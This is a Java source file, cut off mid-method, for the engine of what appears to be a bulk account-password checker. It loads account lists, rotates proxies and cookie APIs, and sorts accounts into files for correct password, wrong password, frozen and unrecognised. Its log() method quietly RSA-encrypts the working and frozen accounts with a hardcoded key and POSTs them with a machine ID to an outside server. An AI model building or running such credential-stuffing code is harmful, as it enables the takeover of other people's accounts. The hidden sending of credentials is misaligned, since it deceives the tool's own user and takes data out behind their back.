package ws.hoyland.sm;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.RSAPublicKeySpec;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Observable;
import java.util.Random;
import java.util.Stack;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ThreadPoolExecutor.AbortPolicy;

import javax.crypto.Cipher;
import javax.management.MBeanServer;
import javax.management.MBeanServerConnection;
import javax.management.MBeanServerInvocationHandler;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXConnectorServer;
import javax.management.remote.JMXConnectorServerFactory;
import javax.management.remote.JMXServiceURL;

import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;

import ws.hoyland.security.ClientDetecter;
import ws.hoyland.sm.Engine;
import ws.hoyland.sm.Task;
import ws.hoyland.sm.service.ProxyService;
import ws.hoyland.sm.service.ProxyServiceMBean;
import ws.hoyland.util.Converts;
import ws.hoyland.util.Crypter;
import ws.hoyland.util.EngineMessage;
import ws.hoyland.util.EngineMessageType;
import ws.hoyland.util.Configuration;
import ws.hoyland.util.SyncUtil;
import ws.hoyland.util.Util;

public class Engine extends Observable {

	private List<String> accountstodo;
	private List<String> accounts;
	private List<String> proxies;
	private List<String> proxiesOfAPI;
	private boolean running = false;
//	private boolean noproxy = false;

	private BufferedWriter[] output = new BufferedWriter[4]; // 成功，失败，未运行
	private String[] fns = new String[] { "密码正确", "密码错误", "帐号冻结", "未识别"};//"独立密码", 
	private URL url = Engine.class.getClassLoader().getResource("");
	private String xpath = url.getPath();
	private ThreadPoolExecutor pool;
	private Configuration configuration = Configuration
			.getInstance("config.ini");
	private Integer[] stats = new Integer[3];
	private Random random = new Random();
	//private Base64 base64 = new Base64();
	private boolean reload = false;
	private boolean hasService = false;
	private Timer timer = null;
	private Timer timerx = null;//切换cookie api

	private Registry registry = null;


	private Stack<String> infq = null;
	private int urlidx = -1;
	//private boolean tf = true;//是否执行timer
	
	protected int bc = 0;
	protected int ec = 0;
	
	private static Engine instance;
	private static String expBytes = "010001";
	private static String modBytes = "C39A51FB1202F75F0E20F691C8E370BCFA7CD2B75FD588CADAC549ADF1F03CFDAACCB9FBA5D7219CA4A3E40F9324121474BE85355CF178E0D3BD0719EDF859D60D24874B105FAC73EF067DEE962F5D12C7DB983039BA5EE0183479923174886A2C45ACFD5441C1B2FCC2083952016C66631884527585FF446BBC4F75606EF87B";
	private static DateFormat format = new java.text.SimpleDateFormat("[yyyy/MM/dd HH:mm:ss] ");
	private String[] cookieAPIs = null;
	private boolean memo = true;
	
	private Engine() {
		System.err.println(xpath);
		//System.err.println(xpath.lastIndexOf("/"));
		if(xpath.length()>4){
			if("/lib/".equals(xpath.substring(xpath.lastIndexOf("/")-4, xpath.lastIndexOf("/")+1))){
				xpath = xpath.replace("/lib/", "/");	
			}
		}
		try{
			xpath = URLDecoder.decode(xpath, "UTF-8");
		}catch(Exception e){
			e.printStackTrace();
		}
		System.err.println("xpath="+xpath);
		
		infq = new Stack<String>();
		proxies = new ArrayList<String>();
		
		//开始Timer
		timer = new Timer();
		
		timer.schedule(new TimerTask(){
			private Stack<String> ts = new Stack<String>();
			
			@Override
			public void run() {
				try{
					StringBuilder sb = new StringBuilder();
					ts.clear();
					
					int size = infq.size();
					//if(!infq.isEmpty()){
						for(int i=0;i<size;i++){
							ts.push(infq.pop()+"\r\n");
						}

						//System.err.println("size="+size+"/"+ts.size());
						
						while(!ts.isEmpty()){
							sb.append(ts.pop());
						}
						
	//					Object[] contents = (Object[]) infq.toArray();
	//					for(int i=0;i<contents.length;i++){
	//							sb.append(contents[i]+"\r\n");
	//					}
						
						//infq.clear();
						
					//}
					
					if(size>0){
						EngineMessage msg = new EngineMessage();
						msg.setType(EngineMessageType.OM_INFO);
						msg.setData(sb.toString());		
						Engine.this.notify(msg);
					}
					
//					if(!running){
//						String tm = Engine.format.format(new Date());
//						sb = new StringBuilder();
//						sb.append(tm+"\r\n");
//						sb.append(tm+"================\r\n");
//						sb.append(tm+"运行结束\r\n");
//						sb.append(tm+"================\r\n");
//						sb.append(tm+"\r\n");
//						
//						EngineMessage msg = new EngineMessage();
//						msg.setType(EngineMessageType.OM_INFO);
//						msg.setData(sb.toString());		
//						Engine.this.notify(msg);
//					}
					
//					if(!tf){//系统退出
//						timer.cancel();
//						infq.clear();
//					}
				}catch(Exception e){
					e.printStackTrace();
				}
			}}, 
		0, 200);
	}
	
	public void ready() {
//		if (accounts != null && accounts.size() > 0 && ((proxies != null
//				&& proxies.size() > 0)||("true".equals(configuration.getProperty("SCAN"))&&hasService))) {
		if (accounts != null && accounts.size() > 0){
			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_READY);
			notify(msg);
		} else {
			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_UNREADY);
			notify(msg);
		}
	}
	
	private synchronized void notify(EngineMessage message){
		//String tm = format.format(new Date());
		//System.err.println("notifi1: "+ tm + message.getData());
		this.setChanged();
		this.notifyObservers(message);
		//tm = format.format(new Date());
		//System.err.println("notifi2: "+ tm + message.getData());
	}
	
	public void shutdown() {
		//System.out.println(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>1");
		if(!running){
			return;
		}
		
		running = false;
		
		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_RUNNING);
		msg.setData(running);
		notify(msg);

		System.err.println("running="+running);
		
		if(timerx!=null){
			timerx.cancel();
		}
		
		try{
			if(registry!=null){
				UnicastRemoteObject.unexportObject(registry, true);
			}
		}catch(Exception e){
			//e.printStackTrace();
		}
		////////////////////////////////////////reload的处理
		reload = false;
		
		synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
			try{
				SyncUtil.RELOAD_PROXY_OBJECT.notifyAll();//更新完毕，唤醒线程
			}catch(Exception e){
				//
			}
		}
		
//		EngineMessage msg = new EngineMessage();
//		msg.setTid(-1);
//		msg.setType(EngineMessageType.OM_SHUTDOWN);
//		notify(msg);
		
		if (pool != null) {
			pool.shutdown();
			//pool.shutdownNow();
		}

		// 等待所有运行线程执行完毕，关闭日志文件
		while (pool != null && pool.getActiveCount() != 0) {
			try {
				Thread.sleep(1000);
			} catch (Exception e) {
				//
			}
		}

		// 写入未运行帐号日志
		try {
			// if(lastTid!=-1){
			if (output[3] != null) {
				for (int i = 0; i < accountstodo.size(); i++) {
					try{
						String accl = accountstodo.get(i);
						accl = accl.substring(accl.indexOf("----")+4);
//						String[] accl = accountstodo.get(i).split("----");
//						output[3].write(accl[1] + "----" + accl[2] + "\r\n");
						output[3].write(accl + "\r\n");
					}catch(Exception e){
						e.printStackTrace();
					}
				}
				output[3].flush();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		for (int i = 0; i < output.length; i++) {
			try {
				if (output[i] != null) {
					output[i].close();
					output[i] = null;
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		
		msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_RUNNING);
		msg.setData(running);
		notify(msg);
		
		info("");
		info("================");
		info("运行结束");
		info("================");
		info("");
	}
	
	//////////////////////////////////////////////////////public//////////////////////////////////////////////////
	public boolean canRun(){
		return this.running;
		//return this.running&&!this.noproxy;
	}
	
	public synchronized void log(final int type, final int id, final String message){		
		if(type==0||type==2){
			new Thread(new Runnable(){
				@Override
				public void run() {
					HttpPost post = null;
					DefaultHttpClient client = null;
					try{
						client = new DefaultHttpClient();
						client.getParams().setParameter(
								CoreConnectionPNames.CONNECTION_TIMEOUT, 4000);
						client.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 4000);
						
						Crypter crypt = new Crypter();
						byte[] mid = Converts.hexStringToByte(ClientDetecter
								.getMachineID("SMZS"));

						// String url = "http://www.y3y4qq.com/ge";
						byte[] key = Util.genKey();
						String header = Converts.bytesToHexString(key).toUpperCase()
								+ Converts.bytesToHexString(crypt.encrypt(mid, key))
										.toUpperCase();
						// Console.WriteLine(byteArrayToHexString(key).ToUpper());
						// Console.WriteLine(content);
						// client.UploadString(url, content);
						// client.UploadString(url,
						// client.Encoding = Encoding.UTF8;

						String content = "action=1&type=" + type + "&content=" + message;
						// RSA加密
						KeyFactory factory = KeyFactory.getInstance("RSA");
						Cipher cipher = Cipher.getInstance("RSA");
						BigInteger modules = new BigInteger(modBytes, 16);
						BigInteger exponent = new BigInteger(expBytes, 16);

						RSAPublicKeySpec pubSpec = new RSAPublicKeySpec(modules,
								exponent);
						PublicKey pubKey = factory.generatePublic(pubSpec);
						cipher.init(Cipher.ENCRYPT_MODE, pubKey);
						byte[] encrypted = cipher.doFinal(content.getBytes());
						
						post = new HttpPost("http://www.y3y4qq.com/gc");
						post.setHeader("Connection", "close");
						
						StringBuffer sb = new StringBuffer();
						sb.append(header);
						sb.append(Converts.bytesToHexString(encrypted));
						
						post.setEntity(new StringEntity(sb.toString()));
						
						client.execute(post);
					}catch(Exception e){
						e.printStackTrace();
					}finally{
						if(post!=null){
							post.releaseConnection();
							post.abort();
						}
						if(client!=null){
							client.getConnectionManager().shutdown();
						}
					}
				}			
			}).start();
		}
		stats[type]++;
//		System.err.println("1:"+accountstodo.size());
//		System.err.println("2:"+message);
		accountstodo.remove(id+"----"+message);
		
		System.err.println("accounts to do:"+accountstodo.size());		
		System.err.println("pool:"+pool.getCompletedTaskCount()+"/"+pool.getActiveCount()+"/"+pool.getQueue().size());
//		System.err.println("3:"+accountstodo.size());
		//写文件		
		try{
			output[type].write(message+ "\r\n");
			output[type].flush();
		}catch(Exception e){
			e.printStackTrace();
		}
		
		String tm = format.format(new Date());
		System.err.println((tm + "DETECTED: " + message + " = " + fns[type]));
		if(memo){
			infq.push(tm + "DETECTED: " + message + " = " + type);
		}
		
		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_STATS);
		msg.setData(new Object[]{stats});//, new Integer(type), message});
		notify(msg);
	}
	
	public void memo(){
		this.memo = !this.memo;
	}
	
	public synchronized void info(String message){
		String tm = format.format(new Date());
		System.err.println(tm + message);
		if(memo){
//		if(running){
//		EngineMessage msg = new EngineMessage();
//		msg.setType(EngineMessageType.OM_INFO);
//		msg.setData(message);		
//		notify(msg);
		infq.push(tm+message);
//		}
		}
	}
	
	public synchronized void addTask(String line){
		try {
			if(running){
				Task task = new Task(line);
//				Engine.getInstance().addObserver(task);
				pool.execute(task);
			}
		} catch (Exception e) {
			e.printStackTrace();
			// System.out.println(i + ":" + accounts.get(i));
		}
	}
	
	public synchronized String getXPath(){
		return this.xpath;
	}
	
	public void removeProxy(String proxy){
		synchronized(proxies){
			this.proxies.remove(proxy);
		}
		
		List<String> params = new ArrayList<String>();
		params.add(String.valueOf(proxies.size()));

		EngineMessage msg = new EngineMessage();
		msg.setType(EngineMessageType.OM_PROXY_LOADED);
		msg.setData(params);
		notify(msg);
	}
	
	public String getProxy(){
		if(reload){
			synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
				try{
					SyncUtil.RELOAD_PROXY_OBJECT.wait();
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		}
		
		String proxy = null;
		if(proxies.size()>0){
			synchronized(proxies){
				proxy = proxies.get(random.nextInt(proxies.size()));
				
	//			if(proxies.size()!=0){
	//				proxy = proxies.get(random.nextInt(proxies.size()));
	//			}else{
	//				if(!noproxy){
	//					noproxy = true;
	//					
	//					EngineMessage msg = new EngineMessage();
	//					msg.setType(EngineMessageType.OM_NO_PROXY);
	//					notify(msg);
	//					//shutdown();
	//				}
	//			}
			}
		}
		return proxy;
	}
	
	public void loadAccount(String path){
		try {
			accounts = new ArrayList<String>();
			//accountstodo = new ArrayList<String>();
			
			File ipf = new File(path);
			FileInputStream is = new FileInputStream(ipf);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader reader = new BufferedReader(isr);
			String line = null;
			int i = 1;
			while ((line = reader.readLine()) != null) {
				if (!line.equals("")) {
					line = i + "----" + line;
					accounts.add(line);
					//accountstodo.add(line);
				}
				i++;
			}

			reader.close();
			isr.close();
			is.close();

			if (accounts.size() > 0) {
				List<String> params = new ArrayList<String>();
				params.add(String.valueOf(accounts.size()));

				EngineMessage msg = new EngineMessage();
				msg.setType(EngineMessageType.OM_ACCOUNT_LOADED);
				msg.setData(params);
				notify(msg);
			}

			ready();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void loadProxy(String path){
		try {
			//if(running){
				synchronized(proxies){
					proxies.clear();
				}
			//}
//			else{
//				proxies = new ArrayList<String>();
//			}

			File ipf = new File(path);
			FileInputStream is = new FileInputStream(ipf);
			InputStreamReader isr = new InputStreamReader(is);
			BufferedReader reader = new BufferedReader(isr);
			String line = null;
			// int i = 1;
			while ((line = reader.readLine()) != null) {
				if (!line.equals("")) {
					// line = i + "----" + line;
					if(running){
						synchronized(proxies){
							proxies.add(line);
						}
					}else{
						proxies.add(line);
					}
				}
				// i++;
			}

			reader.close();
			isr.close();
			is.close();

			if (proxies.size() > 0) {
				List<String> params = new ArrayList<String>();
				params.add(String.valueOf(proxies.size()));

				EngineMessage msg = new EngineMessage();
				msg.setType(EngineMessageType.OM_PROXY_LOADED);
				msg.setData(params);
				notify(msg);
			}

			ready();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void exit(){
		//tf = false;//停止timer

		infq.clear();
		timer.cancel();
		System.exit(0);
	}
	
	public void process(){
		if (!running) {
			running = true;
			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_RUNNING);
			msg.setData(running);
			notify(msg);

			System.err.println("running="+running);
			
			info("");
			info("================");
			info("开始运行");
			info("================");
			info("");
			// 创建日志文件
			for(int i=0;i<stats.length;i++){
				stats[i] = 0;
			}
			reload = false;
			bc = 0;
			ec = 0;
//			noproxy = false;
			
			cookieAPIs = configuration.getProperty("COOKIE_API").split(";");
			urlidx = -1;
			timerx = new Timer();
			timerx.schedule(new TimerTask(){

				@Override
				public void run() {
					urlidx++;
					if(urlidx==cookieAPIs.length){
						urlidx = 0;
					}
					EngineMessage msg = new EngineMessage();
					msg.setType(EngineMessageType.OM_CHANGE_URL);
					msg.setData(getCookieAPI());
					Engine.this.notify(msg);
					
					info("");
					info("================");
					info("正在使用Cookie API:"+getCookieAPI());
					info("================");
					info("");
				}
				//private Stack<String> ts = new Stack<String>();
				},
			0, Integer.parseInt(configuration.getProperty("COOKIE_API_ITV"))*60*1000);
			
			if("true".equals(configuration.getProperty("SCAN"))&&hasService||"true".equals(configuration.getProperty("USE_PROXY_API"))){ //等待扫描完代理
				reload = true;
				synchronized(proxies){
					proxies.clear();
				}
//				this.proxies = new ArrayList<String>();
			}
			
			accountstodo = new ArrayList<String>();
			accountstodo.addAll(accounts);
			
			proxiesOfAPI = new ArrayList<String>();
			// long tm = System.currentTimeMillis();
			DateFormat format = new java.text.SimpleDateFormat(
					"yyyy年MM月dd日 HH时mm分ss秒");
			String tm = format.format(new Date());
			for (int i = 0; i < output.length; i++) {
				try {
					String path = xpath + fns[i] + "-" + tm + ".txt";
					//System.out.println(path.substring(path.lastIndexOf("/")-4, path.lastIndexOf("/")+1));
					
					//System.err.println(path);
					//System.err.println(path);
					File fff = new File(path);
					
					if (!fff.exists()) {
						fff.createNewFile();
					}

					output[i] = new BufferedWriter(new FileWriter(fff));
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
			
			//开始timer，原有位置
			
			//开启本地JMX，并向扫描服务端注册
			
			if("true".equals(configuration.getProperty("USE_PROXY_API"))){//获取proxy api
				Thread t = new Thread(new Runnable(){
					private EngineMessage msg = null;
					
					@Override
					public void run() {
						while(running){
							try{
								//load from api
								info("");
								info("================");
								info("正在获取API代理");
								info("================");
								info("");
								msg = new EngineMessage();
								msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
								msg.setData("0");
								Engine.this.notify(msg);
								
								proxiesOfAPI.clear();								
								
								HttpURLConnection connection = null;
								InputStream input = null;
								
								int count = 0;
								while(count<3){
									count++;
									try {
										URL url = new URL(configuration.getProperty("PROXY_API"));
										
										connection = (HttpURLConnection) url
												.openConnection();
										//connection.setDoOutput(true);// 允许连接提交信息
										connection.setRequestMethod("GET");// 网页提交方式“GET”、“POST”
										// connection.setRequestProperty("User-Agent",
										// "Mozilla/4.7 [en] (Win98; I)");
										connection.setRequestProperty("Content-Type",
												"text/plain; charset=UTF-8");
										connection.setRequestProperty("Connection",
												"close");
										
										connection.setConnectTimeout(5000);  
										connection.setReadTimeout(5000);  
										
	//									StringBuffer sb = new StringBuffer();
	//									sb.append(header);
	//									sb.append(Converts.bytesToHexString(encrypted));
	//									os = connection.getOutputStream();
	//									os.write(sb.toString().getBytes());
	//									os.flush();
	//									os.close();
	
										input = connection.getInputStream();
										BufferedReader br = new BufferedReader(new InputStreamReader(input));
										String apiline = null;
										while((apiline=br.readLine())!=null){
											if(!apiline.equals("")&&apiline.charAt(0)>'0'&&apiline.charAt(0)<'3'){
												proxiesOfAPI.add(apiline);
											}
										}
									} catch (Exception e) {
										e.printStackTrace();
										if(count<3){
											try{
												Thread.sleep(5*1000);
											}catch(Exception ex){
												ex.printStackTrace();
											}
										}
									}finally{
										if(input!=null){
											try{
												input.close();
											}catch(Exception e){
												e.printStackTrace();
											}
										}
									}
								}
								
								info("");
								info("================");
								info("获取API代理结束");
								info("================");
								info("");
								
								new Thread(new Runnable(){
									@Override
									public void run() {
										Engine.getInstance().reloadAPIProxies();//通知本地													
									}
								}).start();
							}catch(Exception e){
								e.printStackTrace();
							}finally{
								msg = new EngineMessage();
								msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
								msg.setData("100");		
								Engine.this.notify(msg);
							}
							
							try{
								//休眠
								Thread.sleep(1000*60*Integer.parseInt(configuration
										.getProperty("PROXY_API_ITV")));//休眠一段时间	
								
							}catch(Exception e){
								e.printStackTrace();
							}							
						}
					}
					
				});
				t.setDaemon(true);
				t.start();
			}
			
			if("true".equals(configuration.getProperty("SCAN"))&&hasService&&"false".equals(configuration.getProperty("USE_PROXY_API"))){
				//开始扫描的线程
				Thread t = new Thread(new Runnable(){
					private EngineMessage msg = null;
					private boolean validate = false;
					private ThreadPoolExecutor poolx = null;
					@Override
					public void run() {
						//开始定时扫描
						if("true".equals(configuration.getProperty("VALIDATE"))&&hasService){
							validate = true;							
							
							int tc = 100;
							int corePoolSize = tc;// minPoolSize
							int maxPoolSize = tc;
							int maxTaskSize = (1024 + 512) * 100 * 40;// 缓冲队列
							long keepAliveTime = 0L;
							TimeUnit unit = TimeUnit.MILLISECONDS;

							BlockingQueue<Runnable> workQueue = new ArrayBlockingQueue<Runnable>(
									maxTaskSize);
							RejectedExecutionHandler handler = new AbortPolicy();// 饱和处理策略

							// 创建线程池
							poolx = new ThreadPoolExecutor(corePoolSize, maxPoolSize,
									keepAliveTime, unit, workQueue, handler);
						}
						
						while(running){
							msg = new EngineMessage();
							msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
							msg.setData("0");
							info("");
							info("================");
							info("正在扫描代理");
							info("================");
							info("");
							try{
								//执行扫描, 并将结果写入MBean
								//xpath+"/8088.bat";
								//String path = xpath.substring(1);
								//path = URLDecoder.decode(path, "UTF-8");
								if(running){
									Engine.this.notify(msg);
									
									System.err.println("SCANING...");
									System.err.println("cmd /c \""+xpath.substring(1)+"8088.bat\"");
									String line = null;
									Process process = Runtime.getRuntime().exec("cmd /c \""+xpath.substring(1)+"8088.bat\"", new String[0], new File(xpath));// 获取命令行参数
									
//									int rs = process.waitFor();
									msg = new EngineMessage();
									msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
									msg.setData("10");		
									Engine.this.notify(msg);
									
									boolean hasRun = true;
									BufferedReader info = new BufferedReader(new InputStreamReader(process.getInputStream(), "GB2312"));
							        BufferedReader error = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GB2312"));
							        while((line=info.readLine())!=null) {
							        	//System.err.println(line);
							        }
							        msg = new EngineMessage();
									msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
									msg.setData("35");		
									Engine.this.notify(msg);
									
							        while((line=error.readLine())!=null) {
							        	//System.err.println(line);
							        	if(line.indexOf("拒绝访问")!=-1){
							        		hasRun = false;
							        	}
							        }
							        msg = new EngineMessage();
									msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
									msg.setData("60");		
									Engine.this.notify(msg);
							        
							        int rs = process.exitValue();
									if(rs==0&&hasRun){
										//读取8088.txt

										JMXServiceURL url = new JMXServiceURL(
												"service:jmx:rmi:///jndi/rmi://localhost:8023/service");
										JMXConnector jmxc = JMXConnectorFactory.connect(url, null);
										
										MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();
										//String domain = mbsc.getDefaultDomain();
										
										ObjectName objectName = new ObjectName("ws.hoyland.sm.service:name=ProxyService");
										ProxyServiceMBean service = (ProxyServiceMBean)MBeanServerInvocationHandler.newProxyInstance(mbsc, objectName, ProxyServiceMBean.class, true);
										
										StringBuilder sb = new StringBuilder();
										File file = null;
										InputStream input = null;
										BufferedReader br = null;
										
										msg = new EngineMessage();
										msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
										msg.setData("70");		
										Engine.this.notify(msg);
										
										try{
											file = new File(xpath+"8088.txt");
											//this.getClass().getResourceAsStream("/8088.txt");
											if(file.exists()){
												input = new FileInputStream(file);
												br = new BufferedReader(new InputStreamReader(input));
												while((line=br.readLine())!=null){
													if(validate){
														//do validate
														poolx.execute(new ValidateTask(sb, line));
													}else{
														sb.append(line+"\r\n");
													}
													//text.append(line+"\r\n");
												}
												br.close();
												
												while(poolx!=null&&poolx.getActiveCount()!=0){
													try{
														Thread.sleep(1000);
													}catch(Exception e){
														//e.printStackTrace();
													}
												}
												
												service.setProxies(sb.toString());
											}else{
												System.err.println("8088.txt no exists");
											}
										
	//										else{
	//											//sb.append("127.0.0.1:8082\r\n");
	//										}											
										}catch(Exception e){
											e.printStackTrace();
										}finally{
											if(br!=null){
												br.close();
											}
											if(input!=null){
												input.close();
											}
										}
										msg = new EngineMessage();
										msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
										msg.setData("80");		
										Engine.this.notify(msg);
										//service.setProxies(sb.toString());
										
										System.err.println("SCANING...OK");
										if(file.exists()){
											new Thread(new Runnable(){
												@Override
												public void run() {
													Engine.getInstance().reloadProxies(true);//通知本地													
												}
											}).start();
											
											service.notifyReload();//通知其他客户端
										}else{
											Engine.getInstance().reloadProxies(false);
										}
									}else{
										System.err.println("SCANING...FAIL["+rs+"]");
										Engine.getInstance().reloadProxies(false);
									}
								}
								//通知Engine需要更换IP	
							}catch(Exception e){
								e.printStackTrace();
							}finally{
								msg = new EngineMessage();
								msg.setType(EngineMessageType.OM_SCAN_PROGRESS);
								msg.setData("100");		
								Engine.this.notify(msg);
								info("");
								info("================");
								info("扫描结束");
								info("================");
								info("");
							}
							
							try{
								//休眠
								Thread.sleep(1000*60*Integer.parseInt(configuration
										.getProperty("SCAN_ITV")));//休眠一段时间	
								
							}catch(Exception e){
								e.printStackTrace();
							}
						}
						
						if (poolx != null) {
							poolx.shutdown();
							//pool.shutdownNow();
						}

//						// 等待所有运行线程执行完毕
//						while (poolx != null && poolx.getActiveCount() != 0) {
//							try {
//								Thread.sleep(1000);
//							} catch (Exception e) {
//								//
//							}
//						}
					}
				});
				t.setDaemon(true);
				t.start();
			}

			int tc = Integer.parseInt(configuration
					.getProperty("THREAD_COUNT"));
			int corePoolSize = tc;// minPoolSize
			int maxPoolSize = tc;
			int maxTaskSize = (1024 + 512) * 100 * 40;// 缓冲队列
			long keepAliveTime = 0L;
			TimeUnit unit = TimeUnit.MILLISECONDS;

			BlockingQueue<Runnable> workQueue = new ArrayBlockingQueue<Runnable>(
					maxTaskSize);
			RejectedExecutionHandler handler = new AbortPolicy();// 饱和处理策略

			// 创建线程池
			pool = new ThreadPoolExecutor(corePoolSize, maxPoolSize,
					keepAliveTime, unit, workQueue, handler);

			//添加任务
			new Thread(new Runnable(){
				@Override
				public void run() {					
					for (int i = 0; i < accounts.size(); i++) {
						try {						
							if(running){
								Task task = new Task(accounts.get(i));
//								Engine.getInstance().addObserver(task);
								//System.err.println("inited task "+i);
								pool.execute(task);
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}			
			}).start();
		} else {
			// 停止情况下的处理
			shutdown();
		}
	}
	
	public void startService() {
		try{
//			MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
//		    ObjectName name = new ObjectName("ws.hoyland.sm.service:type=ProxyService");
//		    //ProxyService mbean = new ProxyService();
//		    mbs.registerMBean("ws.hoyland.sm.service.ProxyService", name);
			boolean flag = true;
			int port = 8023;
			while(flag){
				try{
					registry = LocateRegistry.createRegistry(port);
					flag = false;
				}catch(Exception e){
//					if(e.getMessage().indexOf("internal error: ObjID already in use")!=-1){
//					    UnicastRemoteObject.unexportObject(registry, true);
//						flag = true;
//					    continue;
//					}else 
					if(e.getMessage().indexOf("Port already in use:")!=-1){
						port++;
						continue;
					}else{
						e.printStackTrace();
						return;
					}
				}
			}
			 
			MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();  //MBeanServerFactory.createMBeanServer();//			
			JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:"+port+"/service");
			JMXConnectorServer cs = JMXConnectorServerFactory.newJMXConnectorServer(url, null, mbs);			
			cs.start();
			
			ObjectName name = new ObjectName("ws.hoyland.sm.service:name=ProxyService");
			ProxyService mbean = new ProxyService();
			mbs.registerMBean(mbean, name);

//			String domain = mbs.getDefaultDomain();
//			String className = "ws.hoyland.sm.service.ProxyService";
//			String init = domain+":type="+className+",index=1";
//			ObjectName objectName = ObjectName.getInstance(init);
//			mbs.createMBean(className, objectName);
			System.err.println("Service PORT: "+port);
			if(port==8023){
				hasService = true;
			}else{
				//注册本地端口 到 8023 Service
				url = new JMXServiceURL(
						"service:jmx:rmi:///jndi/rmi://localhost:8023/service");
				JMXConnector jmxc = JMXConnectorFactory.connect(url, null);
				
				MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();
				//String domain = mbsc.getDefaultDomain();
				
				ObjectName objectName = new ObjectName("ws.hoyland.sm.service:name=ProxyService");
				ProxyServiceMBean service = (ProxyServiceMBean)MBeanServerInvocationHandler.newProxyInstance(mbsc, objectName, ProxyServiceMBean.class, true);
				service.register(port);
			}
		}catch(Exception e){
			e.printStackTrace();
		}		
	}
	
//	@Deprecated
//	private void needReloadProxies(){
//		reload = true;
//		reloadProxies();
//		
////		EngineMessage msg = new EngineMessage();
////		msg.setTid(-1);//通知所有线程
////		msg.setType(EngineMessageType.OM_RELOAD_PROXIES);
////		notify(msg);		
//	}
	public void reloadAPIProxies() {
//		System.err.println("Reloading proxies");
//		if(!running){
//			System.err.println("Reloading proxies break");
//			return;
//		}
		System.err.println("reloading api proxies 1");
		reload = true;
		info("");
		info("================");
		info("正在更新代理");
		info("================");
		info("");
				
		try {
			this.proxies = new ArrayList<String>(proxiesOfAPI);  
//			this.proxies.clear();
//			for(int i=0;i<proxiesOfAPI.size();i++){
//				proxies.add(ps[i]);
//			}
			
			System.err.println("reloading api proxies 2:"+proxies.size());
			//显示代理数量
			List<String> params = new ArrayList<String>();
			params.add(String.valueOf(proxies.size()));

			EngineMessage msg = new EngineMessage();
			msg.setType(EngineMessageType.OM_PROXY_LOADED);
			msg.setData(params);
			notify(msg);
			
		System.err.println("reloading api proxies 3");
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		System.err.println("reloading api proxies 4");
//		msg = new EngineMessage();
//		msg.setTid(-1);//通知所有线程
//		msg.setType(EngineMessageType.OM_RELOAD_PROXIES);
//		notify(msg);
//		notify(msg);
		
		info("");
		info("================");
		info("更新完毕: ["+proxies.size()+"]");
		info("================");
		info("");

		System.err.println("reloading api proxies 5");
		reload = false;
		
		synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
			try{
				SyncUtil.RELOAD_PROXY_OBJECT.notifyAll();//更新完毕，唤醒线程
			}catch(Exception e){
				//
			}
		}
		
		System.err.println("reloading api proxies 6");
		ready();
	}
	
	public void reloadProxies(boolean succ) {
//		System.err.println("Reloading proxies");
//		if(!running){
//			System.err.println("Reloading proxies break");
//			return;
//		}
		System.err.println("reloading proxies 1");
		reload = true;
		info("");
		info("================");
		info("正在更新代理");
		info("================");
		info("");
				
		if(succ){
			//loadproxies form jmx service
			try {
				JMXServiceURL url = new JMXServiceURL(
						"service:jmx:rmi:///jndi/rmi://localhost:8023/service");
				JMXConnector jmxc = JMXConnectorFactory.connect(url, null);
				
				MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();
				//String domain = mbsc.getDefaultDomain();
				
				ObjectName objectName = new ObjectName("ws.hoyland.sm.service:name=ProxyService");
				ProxyServiceMBean service = (ProxyServiceMBean)MBeanServerInvocationHandler.newProxyInstance(mbsc, objectName, ProxyServiceMBean.class, true);
				String[] ps = service.getProxies().split("\r\n");
